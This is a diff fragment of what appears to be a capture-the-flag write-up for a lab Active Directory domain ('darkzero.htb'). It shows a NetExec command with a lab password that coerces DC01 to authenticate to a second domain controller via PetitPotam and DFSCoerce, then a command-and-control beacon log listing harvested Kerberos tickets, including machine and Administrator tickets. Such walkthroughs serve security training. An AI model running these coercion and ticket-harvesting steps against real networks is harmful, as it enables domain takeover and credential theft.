@@ -843,5 +843,70 @@ COERCE_PLUS 10.129.48.21    445    DC01             Exploit Success, efsrpc\EfsR
 This worked
 
 ```python
+nxc smb dc01.darkzero.htb -u john.w -p 'RFulUtONCOL!' -M coerce_plus -o LISTENER=dc02.darkzero.ext
+SMB         10.129.48.21    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.48.21    445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
+COERCE_PLUS 10.129.48.21    445    DC01             VULNERABLE, DFSCoerce
+COERCE_PLUS 10.129.48.21    445    DC01             Exploit Success, netdfs\NetrDfsAddStdRootForced
+COERCE_PLUS 10.129.48.21    445    DC01             VULNERABLE, PetitPotam
+COERCE_PLUS 10.129.48.21    445    DC01             Exploit Success, efsrpc\EfsRpcAddUsersToFile
+[22:10:16] ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered                                                                                                     coerce_plus.py:178
+           ERROR    Error in PrinterBug module: DCERPC Runtime Error: code: 0x16c9a0d6 - ept_s_not_registered                                                                                                     coerce_plus.py:178
+COERCE_PLUS 10.129.48.21    445    DC01             VULNERABLE, MSEven
+```
+
+Ill start coercing the dc01 machine account to connect back to dc02
+
+```python
++--- Task [71b57337] closed ----------------------------------------------------------+
+
+[20/08 22:10:16] ethan [6ccf7130] beacon > kerbeus triage
+[20/08 22:10:16] [*] Task: Kerbeus TRIAGE
+[20/08 22:10:16] [*] Agent called server, sent [14.93 Kb]
+[20/08 22:10:16] [+] BOF output
+
+Action: List Kerberos Tickets (All Users)
+
+
+--------------------------------------------------------------------------------------------------------------------------
+| LUID        | Client                                   | Service                                  |            End Time |
+--------------------------------------------------------------------------------------------------------------------------
+| 0:0x282219  | DC01$ @ DARKZERO.HTB                     | krbtgt/DARKZERO.HTB                      | 21.08.2026 02:05:50 |
+| 0:0x40c01   | Administrator @ DARKZERO.EXT             | krbtgt/DARKZERO.EXT                      | 21.08.2026 02:13:03 |
+| 0:0x3e319   | DC02$ @ DARKZERO.EXT                     | ldap/DC02.darkzero.ext                   | 21.08.2026 02:06:46 |
+| 0:0x3e26c   | DC02$ @ DARKZERO.EXT                     | LDAP/DC02.darkzero.ext/darkzero.ext      | 21.08.2026 02:06:46 |
+| 0:0x2a43f   | svc_sql @ DARKZERO.EXT                   | krbtgt/DARKZERO.EXT                      | 21.08.2026 02:08:25 |
+| 0:0x299ca   | DC02$ @ DARKZERO.EXT                     | krbtgt/DARKZERO.EXT                      | 21.08.2026 02:06:46 |
+| 0:0x3e4     | dc02$ @ DARKZERO.EXT                     | krbtgt/DARKZERO.EXT                      | 21.08.2026 02:11:55 |
+| 0:0x3e4     | dc02$ @ DARKZERO.EXT                     | krbtgt/DARKZERO.EXT                      | 21.08.2026 02:11:55 |
+| 0:0x3e4     | dc02$ @ DARKZERO.EXT                     | DNS/dc02.darkzero.ext                    | 21.08.2026 02:11:55 |
+| 0:0x282242  | DC01$ @ DARKZERO.HTB                     | krbtgt/DARKZERO.HTB                      | 21.08.2026 02:05:50 |
+| 0:0x26a8fc  | Administrator @ DARKZERO.EXT             | krbtgt/DARKZERO.EXT                      | 21.08.2026 07:05:20 |
+| 0:0x1fe43f  | Administrator @ DARKZERO.EXT             | krbtgt/DARKZERO.EXT                      | 21.08.2026 06:35:20 |
+| 0:0x5fd34   | DC02$ @ DARKZERO.EXT                     | GC/DC02.darkzero.ext/darkzero.ext        | 21.08.2026 02:06:46 |
+| 0:0x3e221   | DC02$ @ DARKZERO.EXT                     | ldap/DC02.darkzero.ext                   | 21.08.2026 02:06:46 |
+| 0:0x3e1aa   | DC02$ @ DARKZERO.EXT                     | ldap/DC02.darkzero.ext                   | 21.08.2026 02:06:46 |
+| 0:0x26e24   | DC02$ @ DARKZERO.EXT                     | LDAP/DC02.darkzero.ext/darkzero.ext      | 21.08.2026 02:06:46 |
+| 0:0x2244c   | DC02$ @ DARKZERO.EXT                     | ldap/DC02.darkzero.ext                   | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | krbtgt/DARKZERO.HTB                      | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | krbtgt/DARKZERO.EXT                      | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | krbtgt/DARKZERO.EXT                      | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | cifs/DC02.darkzero.ext/darkzero.ext      | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | GC/DC02.darkzero.ext/darkzero.ext        | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | ldap/dc01.darkzero.htb/darkzero.htb      | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | cifs/DC02                                | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | DC02$                                    | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | LDAP/DC02.darkzero.ext/darkzero.ext      | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | ldap/DC02.darkzero.ext                   | 21.08.2026 02:06:46 |
+| 0:0x3e7     | dc02$ @ DARKZERO.EXT                     | LDAP/DC02                                | 21.08.2026 02:06:46 |
+--------------------------------------------------------------------------------------------------------------------------
+[20/08 22:10:16] [+] BOF finished
+
++--- Task [6ccf7130] closed ----------------------------------------------------------+
+```
+
+Ill list the tickets, im targeting the dc01 
+
+```python
 
 ```
